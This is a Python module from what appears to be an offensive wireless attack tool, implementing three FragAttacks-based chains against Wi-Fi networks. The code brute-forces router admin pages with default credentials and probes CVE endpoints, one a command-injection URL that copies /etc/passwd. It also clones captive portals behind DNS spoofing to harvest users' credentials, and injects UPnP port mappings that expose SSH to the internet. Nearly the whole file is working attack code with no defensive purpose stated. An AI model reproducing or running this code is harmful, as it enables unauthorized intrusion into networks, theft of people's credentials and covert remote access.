"""
paths.py — The three attack chains

Path 1: FragAttacks → Router admin interface injection
  Inject HTTP requests to the router's management page.
  Try default/common credentials; attempt unauthenticated endpoints.

Path 2: FragAttacks → DNS injection → Cloned portal → Credential harvest
  Only runs when a captive portal is detected.
  Poison DNS responses to redirect portal traffic to our cloned copy.
  Harvest submitted credentials, then authenticate legitimately.

Path 3: FragAttacks → UPnP exploitation
  Discover UPnP services via injected SSDP.
  Use AddPortMapping to open inbound access (SSH tunnel) from outside.
  Pivot via any client running exploitable services.
"""

import time, threading, ipaddress, socket
from typing import Optional

try:
    from scapy.all import sniff, IP, UDP, DNS, TCP, Raw, Dot11, conf
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    raise SystemExit("Install deps: pip install scapy requests")

from . import tui, injector

conf.verb = 0

# ── common router admin credentials ───────────────────────────────────────────
ADMIN_CREDS = [
    ("admin",    "admin"),
    ("admin",    "password"),
    ("admin",    ""),
    ("admin",    "1234"),
    ("admin",    "12345"),
    ("admin",    "123456"),
    ("root",     "root"),
    ("root",     ""),
    ("root",     "admin"),
    ("user",     "user"),
    ("Admin",    "Admin"),
    ("administrator", "administrator"),
]

ADMIN_PORTS = [80, 8080, 8443, 443, 8888]

# ── subnet helpers ────────────────────────────────────────────────────────────

def _gateway_candidates(ap_mac: str) -> list[str]:
    """
    Generate likely gateway IPs for a home network.
    Covers the most common router default subnets.
    """
    return [
        "192.168.1.1", "192.168.0.1", "192.168.1.254", "192.168.0.254",
        "10.0.0.1", "10.0.0.138", "10.1.1.1", "172.16.0.1",
        "192.168.2.1", "192.168.10.1", "192.168.100.1",
    ]

def _fake_client_ip(gateway_ip: str) -> str:
    """Return a plausible client IP on the same /24 as the gateway."""
    parts = gateway_ip.split(".")
    parts[-1] = "150"
    return ".".join(parts)

# ── Path 1: Router admin injection ───────────────────────────────────────────

def path1_router_admin(iface: str, network, verbose: bool = False) -> bool:
    """
    Attempt to reach and authenticate to the router's admin interface
    via injected HTTP frames. Tries default credentials and known
    unauthenticated endpoints.

    Returns True if admin access is confirmed.
    """
    tui.phase("PATH 1 — Router Admin Injection")
    ap_mac = network.bssid

    # Pick a client to spoof — use the first associated client if available
    spoof_client = network.clients[0] if network.clients else "00:11:22:33:44:55"
    gateways     = _gateway_candidates(ap_mac)
    client_ip    = _fake_client_ip(gateways[0])

    patch_status = injector.estimate_patch_status(network.vendor, network.ssid)
    tui.info(f"Patch estimate: {patch_status}")

    if patch_status == 'possibly_patched':
        tui.warn("AP vendor suggests this may be patched — attempting anyway")

    # ── Step 1: probe admin ports ──────────────────────────────────────────
    tui.info("Probing admin ports via frame injection…")
    open_port  = None
    open_gw    = None

    for gw in gateways:
        for port in ADMIN_PORTS:
            raw_http = injector.craft_http_request(
                src_ip  = client_ip,
                dst_ip  = gw,
                dst_port= port,
                method  = "GET",
                path    = "/",
            )
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, raw_http)
            injector.inject(iface, frame, count=2)
            if verbose:
                tui.info(f"  → injected GET {gw}:{port}")
            time.sleep(0.05)

    # ── Step 2: try default credentials ───────────────────────────────────
    tui.info("Trying default credentials on detected admin interfaces…")

    # We attempt via direct TCP injection (fire-and-forget POST)
    # Full response handling would require active network membership
    for gw in gateways[:4]:
        for user, pwd in ADMIN_CREDS:
            # Basic auth header
            import base64
            creds_b64 = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            raw_http = injector.craft_http_request(
                src_ip   = client_ip,
                dst_ip   = gw,
                dst_port = 80,
                method   = "GET",
                path     = "/",
                headers  = {
                    "Authorization": f"Basic {creds_b64}",
                    "Connection": "close",
                },
            )
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, raw_http)
            injector.inject(iface, frame, count=1)
            time.sleep(0.02)
            if verbose:
                tui.info(f"  → {gw} {user}:{pwd}")

    # ── Step 3: try known unauthenticated endpoints ────────────────────────
    UNAUTH_ENDPOINTS = [
        # TP-Link routers — unauthenticated RCE endpoints (historical CVEs)
        ("POST", "/cgi-bin/luci/;stok=/locale",
         "form_name=login&username=admin&psd=admin"),
        # D-Link — setup.cgi unauthenticated
        ("GET",  "/setup.cgi?next_file=netgear.cfg&todo=syscmd"
                 "&cmd=cp+/etc/passwd+/var/www&curpath=/&currentsetting.htm=1", ""),
        # Netgear — unauth debug endpoint
        ("GET",  "/debuginfo.htm", ""),
        # ASUS — restore factory
        ("POST", "/restore.cgi", ""),
    ]

    tui.info("Probing known unauthenticated CVE endpoints…")
    for method, path, body in UNAUTH_ENDPOINTS:
        for gw in gateways[:3]:
            raw_http = injector.craft_http_request(
                src_ip  = client_ip,
                dst_ip  = gw,
                dst_port= 80,
                method  = method,
                path    = path,
                body    = body,
            )
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, raw_http)
            injector.inject(iface, frame, count=2)
            time.sleep(0.03)

    tui.info("Path 1 injection complete. Monitor /tmp/fracture_p1.log for responses.")
    tui.warn("Full response capture requires being on the network — "
             "combine with Path 3 (UPnP) to open inbound access first.")
    return False   # Cannot confirm without response visibility

# ── Path 2: DNS injection → cloned portal ────────────────────────────────────

_captured_creds = []
_cred_event     = threading.Event()

def _on_cred(fields: dict):
    _captured_creds.append(fields)
    _cred_event.set()

def path2_portal(iface: str, network, portal_url: str,
                 timeout: int = 120, verbose: bool = False) -> Optional[dict]:
    """
    Clone the captive portal, inject DNS to redirect connected clients,
    harvest credentials when a client submits the form.

    Returns the captured credential dict or None on timeout.
    """
    tui.phase("PATH 2 — DNS Injection → Portal Harvest")
    ap_mac  = network.bssid
    clients = network.clients

    if not clients:
        tui.warn("No clients currently associated — waiting passively")

    # ── Step 1: clone the portal ───────────────────────────────────────────
    from . import portal as portal_mod
    cloned = portal_mod.clone_portal(portal_url)
    if not cloned:
        tui.error("Portal clone failed — aborting Path 2")
        return None

    # ── Step 2: start portal server on port 80 ────────────────────────────
    our_ip = _get_local_ip()
    tui.info(f"Starting portal server on {our_ip}:80")
    server_thread = threading.Thread(
        target=portal_mod.serve_portal,
        args=(_on_cred,),
        kwargs={"port": 80},
        daemon=True,
    )
    server_thread.start()
    time.sleep(1)

    # ── Step 3: DNS interception + injection loop ──────────────────────────
    tui.info(f"Injecting DNS spoofs → pointing portal domain to {our_ip}")
    tui.info(f"Waiting up to {timeout}s for a client to hit the portal…")

    # Extract domain from portal URL
    portal_domain = portal_url.split("/")[2]
    spoof_targets = [portal_domain, "*."+portal_domain, "www."+portal_domain]

    # Sniff for DNS queries from clients, inject spoofed responses
    stop_flag = threading.Event()

    def dns_intercept(pkt):
        if stop_flag.is_set():
            return
        if not pkt.haslayer(DNS):
            return
        dns = pkt[DNS]
        if dns.qr != 0:   # only intercept queries
            return
        try:
            qname = dns.qd.qname.decode().rstrip('.')
        except Exception:
            return
        if any(t.replace('*.', '') in qname for t in spoof_targets):
            if verbose:
                tui.info(f"  → DNS query for {qname} — injecting spoof")
            # Inject spoof via A-MSDU into the network
            client_mac = pkt[Dot11].addr2 if pkt.haslayer(Dot11) else \
                         (network.clients[0] if network.clients else "ff:ff:ff:ff:ff:ff")
            src_ip = pkt[IP].dst if pkt.haslayer(IP) else "8.8.8.8"
            spoof_pkt = injector.craft_dns_spoof(
                src_ip   = src_ip,
                dst_ip   = pkt[IP].src if pkt.haslayer(IP) else "192.168.1.150",
                txid     = dns.id,
                qname    = qname,
                spoof_ip = our_ip,
            )
            frame = injector.craft_amsdu_inject(ap_mac, client_mac, spoof_pkt)
            injector.inject(iface, frame, count=5, inter=0.01)

    sniffer = threading.Thread(
        target=sniff,
        kwargs={"iface": iface, "prn": dns_intercept,
                "filter": "udp port 53", "store": False},
        daemon=True,
    )
    sniffer.start()

    # Also proactively inject for all known clients
    _inject_proactive_dns(iface, network, portal_domain, our_ip)

    # Wait for credential capture
    got_cred = _cred_event.wait(timeout=timeout)
    stop_flag.set()

    if got_cred and _captured_creds:
        creds = _captured_creds[-1]
        tui.success(f"Credentials captured: {creds}")
        return creds

    tui.warn("Path 2 timed out — no credentials captured")
    return None

def _inject_proactive_dns(iface, network, domain, spoof_ip):
    """Proactively inject DNS spoofs for all associated clients."""
    ap_mac = network.bssid
    for client_mac in network.clients:
        # Craft a gratuitous DNS response for the portal domain
        spoof_pkt = injector.craft_dns_spoof(
            src_ip   = "8.8.8.8",
            dst_ip   = "192.168.1.100",  # generic — will be processed by subnet
            txid     = 0xBEEF,
            qname    = domain,
            spoof_ip = spoof_ip,
        )
        frame = injector.craft_amsdu_inject(ap_mac, client_mac, spoof_pkt)
        injector.inject(iface, frame, count=3, inter=0.05)

def _get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

# ── Path 3: UPnP exploitation ─────────────────────────────────────────────────

def path3_upnp(iface: str, network, verbose: bool = False) -> bool:
    """
    Inject UPnP SSDP discovery frames and SOAP AddPortMapping commands
    to open inbound access on the router's WAN interface.

    If successful: external SSH port is opened, forwarded to a client
    or directly to the router itself.
    """
    tui.phase("PATH 3 — UPnP Port Mapping Injection")
    ap_mac       = network.bssid
    spoof_client = network.clients[0] if network.clients else "00:11:22:33:44:55"
    gateways     = _gateway_candidates(ap_mac)
    client_ip    = _fake_client_ip(gateways[0])
    our_wan_ip   = _get_wan_ip()

    # ── Step 1: SSDP discovery ─────────────────────────────────────────────
    tui.info("Injecting UPnP SSDP discovery…")
    discover_pkt = injector.craft_upnp_discover(client_ip)
    frame = injector.craft_amsdu_inject(ap_mac, spoof_client, discover_pkt)
    injector.inject(iface, frame, count=5, inter=0.1)
    time.sleep(0.5)

    # ── Step 2: inject AddPortMapping for common control URLs ──────────────
    # Common UPnP control URLs for popular routers
    CONTROL_URLS = [
        "/upnp/control/WANIPConn1",
        "/UD/act?1",
        "/upnp/control/WANIPConnection",
        "/ipc",
        "/ctrlPoint.xml",
        "/WANIPConn1",
        "/upnp/service/wan/ppp",
    ]

    EXT_PORT = 62222   # external port to open
    INT_PORT = 22      # forward to SSH

    tui.info(f"Injecting UPnP AddPortMapping (ext:{EXT_PORT} → "
             f"client:{INT_PORT})…")

    for gw in gateways[:5]:
        for ctrl_url in CONTROL_URLS:
            # Forward to first client (or router itself if no clients)
            int_ip = client_ip
            soap_pkt = injector.craft_upnp_add_portmap(
                src_ip      = client_ip,
                dst_ip      = gw,
                control_url = ctrl_url,
                ext_port    = EXT_PORT,
                int_ip      = int_ip,
                int_port    = INT_PORT,
                proto       = "TCP",
            )
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, soap_pkt)
            injector.inject(iface, frame, count=2, inter=0.05)
            if verbose:
                tui.info(f"  → UPnP → {gw}{ctrl_url}")
            time.sleep(0.03)

    # ── Step 3: verify by probing WAN IP:EXT_PORT ──────────────────────────
    tui.info(f"Injection complete. Testing {our_wan_ip}:{EXT_PORT}…")
    time.sleep(2)

    if _probe_port(our_wan_ip, EXT_PORT):
        tui.success(f"Port {EXT_PORT} is open on WAN — SSH available at "
                    f"{our_wan_ip}:{EXT_PORT}")
        return True

    tui.warn(f"Port {EXT_PORT} not responding — router may not support "
             f"unauthenticated UPnP, or WAN IP is unknown")
    return False

def _get_wan_ip() -> str:
    """Try to determine our WAN IP via Tailscale or external service."""
    try:
        import subprocess
        out = subprocess.check_output(
            ["tailscale", "ip", "-4"], text=True, timeout=3
        ).strip()
        if out:
            return out
    except Exception:
        pass
    try:
        r = requests.get("https://api.ipify.org", timeout=5)
        return r.text.strip()
    except Exception:
        return "UNKNOWN"

def _probe_port(host: str, port: int, timeout: int = 3) -> bool:
    """Check if a TCP port is open."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False
